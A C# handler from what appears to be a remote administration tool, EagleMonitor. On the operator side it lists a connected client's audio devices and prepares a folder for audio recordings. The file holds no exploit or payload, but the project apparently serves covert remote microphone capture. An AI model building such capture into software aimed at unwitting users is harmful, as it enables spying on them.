using EagleMonitor.Networking;
using PacketLib.Packet;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{
    internal class RemoteAudioPacketHandler
    {
        public RemoteAudioPacketHandler(RemoteAudioPacket remoteAudioPacket, ClientHandler clientHandler) : base()
        {
            try
            {
                ClientHandler.ClientHandlersList[remoteAudioPacket.baseIp].remoteAudioForm.BeginInvoke((MethodInvoker)(() =>
                {
                    if (!System.IO.Directory.Exists(ClientHandler.ClientHandlersList[remoteAudioPacket.baseIp].clientPath + "\\Audio Records\\"))
                        System.IO.Directory.CreateDirectory(ClientHandler.ClientHandlersList[remoteAudioPacket.baseIp].clientPath + "\\Audio Records");

                    ClientHandler.ClientHandlersList[remoteAudioPacket.baseIp].audioHelper = new Utils.AudioHelpers();
                    ClientHandler.ClientHandlersList[remoteAudioPacket.baseIp].remoteAudioForm.hasAlreadyConnected = false;
                    foreach (string device in remoteAudioPacket.audioDevices)
                    {
                        ClientHandler.ClientHandlersList[remoteAudioPacket.baseIp].remoteAudioForm.audioDevicesGuna2ComboBox.Items.Add(device);
                    }

                    if (remoteAudioPacket.audioDevices.Count > 0)
                        ClientHandler.ClientHandlersList[remoteAudioPacket.baseIp].remoteAudioForm.audioDevicesGuna2ComboBox.SelectedIndex = 0;
                }));
            }
            catch { }
        }
    }
}
